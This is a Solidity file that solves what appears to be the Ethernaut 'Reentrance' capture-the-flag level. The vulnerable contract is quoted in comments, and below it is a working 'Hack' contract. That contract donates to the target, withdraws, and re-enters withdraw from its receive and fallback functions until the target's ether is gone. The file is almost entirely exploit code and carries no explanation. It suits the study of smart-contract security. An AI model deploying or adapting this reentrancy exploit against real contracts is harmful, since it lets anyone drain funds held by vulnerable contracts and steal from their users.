// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "interfaces/ILevel10.sol";

//import "openzeppelin-contracts-06/math/SafeMath.sol";
// contract Reentrance {
//     using SafeMath for uint256;

//     mapping(address => uint256) public balances;

//     function donate(address _to) public payable {
//         balances[_to] = balances[_to].add(msg.value);
//     }

//     function balanceOf(address _who) public view returns (uint256 balance) {
//         return balances[_who];
//     }

//     function withdraw(uint256 _amount) public {
//         if (balances[msg.sender] >= _amount) {
//             (bool result, ) = msg.sender.call{value: _amount}("");
//             if (result) {
//                 _amount;
//             }
//             balances[msg.sender] -= _amount;
//         }
//     }

//     receive() external payable {}
// }
contract Hack {
    ILevel10 target;
    uint256 public amount = 0.001 ether;

    constructor(address payable _target) {
        target = ILevel10(_target);
    }

    function hack() public payable {
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }

    fallback() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }
}
